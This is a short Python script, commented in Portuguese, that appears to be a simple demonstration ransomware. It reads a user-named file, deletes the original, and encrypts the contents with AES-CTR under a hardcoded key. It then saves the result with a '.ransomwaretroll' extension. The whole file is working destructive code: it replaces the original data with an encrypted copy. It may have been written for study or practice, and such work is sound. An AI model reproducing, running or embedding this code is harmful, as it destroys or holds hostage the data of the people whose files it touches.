import os 
import pyaes

#Solicitar o nome de arquivo ao usuário
file_name = input("Digite o nome do arquivo a ser criptografado: ")
#Verifica se o arquivo existe
if not os.path.exists(file_name):
    file_name="teste.txt"

file = open(file_name,"rb")
file_data = file.read()
file.close()

##Remove o arquivo
os.remove(file_name)

##Chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

##Criptografa arquivo
crypto_data = aes.encrypt(file_data)

##Salva arquivo criptografado
new_file = file_name+ ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()